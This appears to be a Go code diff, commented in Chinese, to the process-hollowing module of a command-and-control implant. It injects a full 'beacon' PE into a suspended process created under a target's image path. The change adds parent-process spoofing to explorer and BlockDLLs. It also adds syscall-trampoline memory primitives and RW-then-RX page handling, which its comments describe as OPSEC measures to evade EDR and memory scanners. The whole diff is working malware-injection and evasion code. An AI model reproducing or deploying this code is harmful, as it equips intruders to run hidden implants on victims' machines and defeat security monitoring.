@@ -3,13 +3,14 @@
 package commands
 
 import (
-	"time"
 	"bytes"
 	"debug/pe"
 	"encoding/binary"
 	"errors"
 	"fmt"
+	"strings"
 	"syscall"
+	"time"
 	"unsafe"
 )
 
@@ -21,11 +22,17 @@ import (
 //
 // 与 donut 远程线程反射加载相比：完整 Go PE 反射加载到远程进程不可靠（Go runtime
 // 依赖正常进程初始化），hollow 以新进程加载规避了该问题。
+//
+// 【OPSEC：W^X】镜像内存一律先申请 RW，写入完成后只把**可执行节**收紧为 RX
+// （hardenImage）。此前整块申请 PAGE_EXECUTE_READWRITE —— 那种 RWX 区块本身就是
+// EDR/内存扫描器最醒目的特征，也与注入链"RW→RX"的原则相矛盾。
 
 type peSectionInfo struct {
-	virtualAddress uint32
-	rawSize        uint32
-	data           []byte
+	virtualAddress  uint32
+	virtualSize     uint32
+	rawSize         uint32
+	characteristics uint32
+	data            []byte
 }
 
 type peImageInfo struct {
@@ -33,7 +40,10 @@ type peImageInfo struct {
 	sizeOfImage         uint32
 	addressOfEntryPoint uint32
 	sizeOfHeaders       uint32
-	sections            []peSectionInfo
+	// hasReloc 镜像带 .reloc 且内容非空 —— 只有这种情况"不在 preferred base"才真的需要
+	// loader 就地写重定位（进而需要可执行节暂时可写）。
+	hasReloc bool
+	sections []peSectionInfo
 }
 
 // ProcessHollow 进程镂空：注入完整 beacon PE，以目标 pid 的镜像路径创建新进程运行。
@@ -68,15 +78,9 @@ func ProcessHollow(pid int, peData []byte) error {
 	getThreadContext := kernel32.NewProc("GetThreadContext")
 	setThreadContext := kernel32.NewProc("SetThreadContext")
 	resumeThread := kernel32.NewProc("ResumeThread")
-	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
-	writeProcessMemory := kernel32.NewProc("WriteProcessMemory")
-	readProcessMemory := kernel32.NewProc("ReadProcessMemory")
 	isWow64Process := kernel32.NewProc("IsWow64Process")
 	getExitCodeProcess := kernel32.NewProc("GetExitCodeProcess")
 	closeHandle := kernel32.NewProc("CloseHandle")
-	ntdll := syscall.NewLazyDLL("ntdll.dll")
-	ntUnmapViewOfSection := ntdll.NewProc("NtUnmapViewOfSection")
-	ntQueryInformationProcess := ntdll.NewProc("NtQueryInformationProcess")
 
 	// 1. CreateProcessW 挂起创建新进程（同路径 -> 进程名伪装为目标进程）
 	var si syscall.StartupInfo
@@ -86,10 +90,24 @@ func ProcessHollow(pid int, peData []byte) error {
 	var pi syscall.ProcessInformation
 	appPtr, _ := syscall.UTF16PtrFromString(imgPath)
 	const createSuspended = 0x08000000
+	const extendedStartupInfoPresent = 0x00080000
+
+	// 父进程伪造 + BlockDLLs：孩子一出生，EPROCESS 里的父进程字段就是 explorer，
+	// 之后的任务管理器/进程树重建只能看到伪造结果。取不到属性时退化为普通创建。
+	ca := newChildAttrs()
+	defer ca.Close()
+	siEx := startupInfoExW{StartupInfo: si}
+	flags := uint32(createSuspended)
+	lpSi := uintptr(unsafe.Pointer(&siEx))
+	if ca != nil && ca.list != nil {
+		siEx.ProcThreadAttributeList = uintptr(unsafe.Pointer(ca.list.List()))
+		siEx.StartupInfo.Cb = uint32(unsafe.Sizeof(siEx))
+		flags |= extendedStartupInfoPresent
+	}
 	r, _, _ := createProcessW.Call(
 		uintptr(unsafe.Pointer(appPtr)), 0, 0, 0, 0,
-		createSuspended, 0, 0,
-		uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
+		uintptr(flags), 0, 0,
+		lpSi, uintptr(unsafe.Pointer(&pi)))
 	if r == 0 {
 		return fmt.Errorf("CreateProcessW(%s) 失败", imgPath)
 	}
@@ -102,79 +120,52 @@ func ProcessHollow(pid int, peData []byte) error {
 		return errors.New("目标进程为 32 位(Wow64)，镂空注入仅支持 64 位目标进程，请选择 64 位目标")
 	}
 
+	// 远端内存原语：syscall 模式优先 NtXxx trampoline，失败逐项回退 kernel32/ntdll。
+	rm := newRemoteMemory()
+	procHandle := uintptr(pi.Process)
+
 	// 2. 读取子进程 PEB 中的原镜像实际基址（ASLR 随机化后与 preferred base 不同）
 	//    并卸载该基址上的原镜像。PROCESS_BASIC_INFORMATION x64: PebBaseAddress 在 +0x8。
-	var pbi [6]uintptr
-	st, _, _ := ntQueryInformationProcess.Call(uintptr(pi.Process), 0,
-		uintptr(unsafe.Pointer(&pbi[0])), uintptr(unsafe.Sizeof(pbi)), 0)
-	if st != 0 || pbi[1] == 0 {
-		return fmt.Errorf("读取子进程 PEB 失败 (status=0x%x)", st)
+	pebAddr, err := rm.PEBAddress(procHandle)
+	if err != nil {
+		return fmt.Errorf("读取子进程 PEB 失败: %v", err)
 	}
-	pebAddr := pbi[1]
-	var origBase uintptr
-	var nRead uintptr
-	if r, _, _ := readProcessMemory.Call(uintptr(pi.Process), pebAddr+0x10,
-		uintptr(unsafe.Pointer(&origBase)), 8, uintptr(unsafe.Pointer(&nRead))); r == 0 || nRead != 8 {
+	origBaseRaw, err := rm.Read(procHandle, pebAddr+0x10, 8)
+	if err != nil || len(origBaseRaw) != 8 {
 		return errors.New("读取原镜像基址失败")
 	}
+	origBase := uintptr(binary.LittleEndian.Uint64(origBaseRaw))
 
-	var unmapStatus uintptr
-	if unmapStatus, _, _ = ntUnmapViewOfSection.Call(uintptr(pi.Process), origBase); unmapStatus != 0 {
-		// 极少见：读到的基址未被映射。继续，尝试在 beacon preferred base 分配
-	}
+	// 极少见：读到的基址未被映射。失败也继续（下面按"分配失败"处理）
+	unmapStatus, unmapErr := rm.Unmap(procHandle, origBase)
+	_ = unmapErr
 
-	// 3. 在 beacon preferred ImageBase 分配 RWX（Go runtime 运行期自管页保护）
-	var allocAtAddr uintptr
-	allocAtAddr, _, _ = virtualAllocEx.Call(
-		uintptr(pi.Process), info.imageBase,
-		uintptr(info.sizeOfImage),
-		0x3000, // MEM_COMMIT|MEM_RESERVE
-		0x40,   // PAGE_EXECUTE_READWRITE
-	)
-	addr := allocAtAddr
-	if addr == 0 {
-		// 目标基址被占：回退任意地址（beacon 带 .reloc，loader 会按 PEB 基址重定位）
-		addr, _, _ = virtualAllocEx.Call(
-			uintptr(pi.Process), 0,
-			uintptr(info.sizeOfImage),
-			0x3000, 0x40,
-		)
-		if addr == 0 {
-			return fmt.Errorf("VirtualAllocEx 失败 (unmap=0x%x)", unmapStatus)
-		}
+	// 3. 预留镜像内存：一律 RW（不申请 RWX；执行保护由 hardenImage 收紧）
+	addr, fellBack, err := reserveImage(rm, procHandle, info)
+	if err != nil {
+		return fmt.Errorf("%v (unmap=0x%x)", err, unmapStatus)
 	}
 
 	// 4. 无条件更新 PEB->ImageBaseAddress = beacon 实际基址：
 	//    loader 初始化 APC 以该字段定位主镜像，解析 IAT / 注册异常表 / 重定位。
-	if r, _, _ := writeProcessMemory.Call(uintptr(pi.Process), pebAddr+0x10,
-		uintptr(unsafe.Pointer(&addr)), 8, uintptr(unsafe.Pointer(&nRead))); r == 0 {
-		return errors.New("更新 PEB ImageBaseAddress 失败")
+	var ibRaw [8]byte
+	binary.LittleEndian.PutUint64(ibRaw[:], uint64(addr))
+	if _, err := rm.Write(procHandle, pebAddr+0x10, ibRaw[:]); err != nil {
+		return fmt.Errorf("更新 PEB ImageBaseAddress 失败: %v", err)
 	}
 
 	// 5. 写 PE 头 + 各节
-	var written uintptr
-	r, _, _ = writeProcessMemory.Call(
-		uintptr(pi.Process), addr,
-		uintptr(unsafe.Pointer(&peData[0])),
-		uintptr(info.sizeOfHeaders),
-		uintptr(unsafe.Pointer(&written)))
-	if r == 0 {
-		return fmt.Errorf("写 PE 头失败 (unmap=0x%x)", unmapStatus)
+	if err := writeImage(rm, procHandle, addr, info, peData); err != nil {
+		return fmt.Errorf("%v (unmap=0x%x)", err, unmapStatus)
 	}
-	for _, sec := range info.sections {
-		if len(sec.data) == 0 {
-			continue
-		}
-		dst := addr + uintptr(sec.virtualAddress)
-		var w uintptr
-		r, _, _ = writeProcessMemory.Call(
-			uintptr(pi.Process), dst,
-			uintptr(unsafe.Pointer(&sec.data[0])),
-			uintptr(len(sec.data)),
-			uintptr(unsafe.Pointer(&w)))
-		if r == 0 {
-			return fmt.Errorf("写节失败 va=0x%x (unmap=0x%x)", sec.virtualAddress, unmapStatus)
-		}
+
+	// 5.5 收紧可执行节（RW → RX）：写入阶段结束，执行期不再可写。
+	//     只有"镜像不在 preferred base 且带重定位表"时才保留可执行节的写权限，
+	//     因为 loader 会在 ResumeThread 之后就地把重定位写进 .text。
+	needReloc := fellBack && info.hasReloc
+	protNotes, err := hardenImage(rm, procHandle, addr, info, needReloc)
+	if err != nil {
+		return err
 	}
 
 	// 6. 设置主线程入口点 RIP = 实际基址 + AddressOfEntryPoint
@@ -202,18 +193,19 @@ func ProcessHollow(pid int, peData []byte) error {
 
 	// 诊断：短暂等待后读取新进程退出码（259=STILL_ACTIVE 运行中；否则为崩溃退出码）
 	time.Sleep(1500 * time.Millisecond)
+	protNote := strings.Join(protNotes, ",")
+	diag := fmt.Sprintf("origBase=0x%x unmap=0x%x alloc=0x%x pref=0x%x entry=0x%x reloc=%v backend=%s prot=[%s] attrs=%s",
+		origBase, unmapStatus, addr, info.imageBase, info.addressOfEntryPoint, needReloc, rm.Backend(), protNote, ca.Describe())
 	var exitCode uint32
 	if r, _, _ = getExitCodeProcess.Call(uintptr(pi.Process), uintptr(unsafe.Pointer(&exitCode))); r != 0 {
-		hollowLastResult = fmt.Sprintf("origBase=0x%x unmap=0x%x alloc=0x%x pref=0x%x entry=0x%x exit=0x%x alive=%v",
-			origBase, unmapStatus, addr, info.imageBase, info.addressOfEntryPoint, exitCode, exitCode == 259)
+		hollowLastResult = diag + fmt.Sprintf(" exit=0x%x alive=%v", exitCode, exitCode == 259)
 		if exitCode != 259 {
 			// 注入操作本身成功但 beacon 启动即崩溃：显式报错（而非假成功），
 			// 把退出码带回控制台便于定位（0xC0000005=IAT/重定位问题）
 			return fmt.Errorf("beacon 进程启动后即退出 (exit=0x%x)：%s", exitCode, hollowLastResult)
 		}
 	} else {
-		hollowLastResult = fmt.Sprintf("origBase=0x%x unmap=0x%x alloc=0x%x pref=0x%x entry=0x%x exit=GetExitCodeFailed",
-			origBase, unmapStatus, addr, info.imageBase, info.addressOfEntryPoint)
+		hollowLastResult = diag + " exit=GetExitCodeFailed"
 	}
 	return nil
 }
@@ -275,10 +267,107 @@ func parsePEImage(data []byte) (*peImageInfo, error) {
 	for _, s := range f.Sections {
 		secData, _ := s.Data()
 		info.sections = append(info.sections, peSectionInfo{
-			virtualAddress: s.VirtualAddress,
-			rawSize:        s.Size,
-			data:           secData,
+			virtualAddress:  s.VirtualAddress,
+			virtualSize:     s.VirtualSize,
+			rawSize:         s.Size,
+			characteristics: s.Characteristics,
+			data:            secData,
 		})
+		if s.Name == ".reloc" && len(secData) > 0 {
+			info.hasReloc = true
+		}
 	}
 	return info, nil
+}
+
+// ===== 镂空的内存布局步骤（抽出来是为了能被单测钉住）=====
+
+// reserveImage 为镂空镜像预留内存：优先 preferred ImageBase（无需重定位，
+// loader 不会往 .text 写），失败才退任意地址。
+//
+// 分配一律 PAGE_READWRITE —— 没有任何一页是"一分配就可执行"的；
+// 执行保护由 hardenImage 在写入完成后收紧。
+// 返回的 fellBack 表示"没能拿到 preferred base"，是后面判断是否需要重定位的依据。
+func reserveImage(rm remoteMemory, h uintptr, info *peImageInfo) (addr uintptr, fellBack bool, err error) {
+	size := uintptr(info.sizeOfImage)
+	addr, err = rm.Alloc(h, info.imageBase, size, pageReadWrite)
+	if err == nil && addr != 0 {
+		return addr, addr != info.imageBase, nil
+	}
+	addr, err = rm.Alloc(h, 0, size, pageReadWrite)
+	if err != nil || addr == 0 {
+		if err == nil {
+			err = errors.New("分配返回 0 且无错误")
+		}
+		return 0, true, fmt.Errorf("为镜像预留内存失败: %v", err)
+	}
+	return addr, addr != info.imageBase, nil
+}
+
+// writeImage 把 PE 头与各节写进已预留的内存（写入期内存仍是 RW）。
+func writeImage(rm remoteMemory, h, base uintptr, info *peImageInfo, peData []byte) error {
+	if uintptr(info.sizeOfHeaders) > uintptr(len(peData)) {
+		return errors.New("PE 头长度超出载荷数据")
+	}
+	if _, err := rm.Write(h, base, peData[:info.sizeOfHeaders]); err != nil {
+		return fmt.Errorf("写 PE 头失败: %v", err)
+	}
+	for _, sec := range info.sections {
+		if len(sec.data) == 0 {
+			continue
+		}
+		if _, err := rm.Write(h, base+uintptr(sec.virtualAddress), sec.data); err != nil {
+			return fmt.Errorf("写节失败 va=0x%x: %v", sec.virtualAddress, err)
+		}
+	}
+	return nil
+}
+
+// hardenImage 收紧**可执行节**：RW → RX（写入阶段已结束）。
+//
+// 为什么只动可执行节、非可执行节保持 RW（这是与本项目"注入走 RW→RX"一致的取舍，
+// 但镂空比注入多一层限制，必须说清楚）：
+//
+//	镂空用的是私有内存（VirtualAllocEx），不是 SEC_IMAGE 映射，因此没有写时复制兜底。
+//	loader 在 ResumeThread 之后才解析导入表，它要**写** IAT（通常落在 .rdata），
+//	Go runtime 还要写 .data 里的全局。把这些页先设为只读，loader 会在 IAT 写入处
+//	访问违例 —— 症状是"注入报成功、beacon 启动即 0xC0000005 退出"。
+//	所以真正被消除的是 RWX：**没有任何可执行页同时可写**。
+//
+// relocating=true 时（镜像不在 preferred base 且带重定位表），可执行节必须保留写权限：
+// 重定位写发生在 ResumeThread 之后、beacon 入口之前，且不经过我们的代码。
+// 这条路径会出现在回包诊断里（prot=[...RWX(重定位期)]），不是静默降级。
+func hardenImage(rm remoteMemory, h, base uintptr, info *peImageInfo, relocating bool) ([]string, error) {
+	var notes []string
+	for _, sec := range info.sections {
+		if sec.characteristics&scnMemExecute == 0 {
+			continue
+		}
+		size := uintptr(sec.virtualSize)
+		if size == 0 {
+			size = uintptr(sec.rawSize)
+		}
+		if size == 0 {
+			continue
+		}
+		// 不越过镜像边界（末节的 VirtualSize 可能超出 SizeOfImage 的余量）
+		off := uintptr(sec.virtualAddress)
+		if off+size > uintptr(info.sizeOfImage) {
+			if off >= uintptr(info.sizeOfImage) {
+				continue
+			}
+			size = uintptr(info.sizeOfImage) - off
+		}
+		prot := uint32(pageExecuteRead)
+		label := "RX"
+		if relocating {
+			prot = pageExecuteReadWrite
+			label = "RWX(重定位期)"
+		}
+		if _, err := rm.Protect(h, base+off, size, prot); err != nil {
+			return notes, fmt.Errorf("收紧节保护失败 va=0x%x: %v", sec.virtualAddress, err)
+		}
+		notes = append(notes, fmt.Sprintf("va=0x%x=%s", sec.virtualAddress, label))
+	}
+	return notes, nil
 }
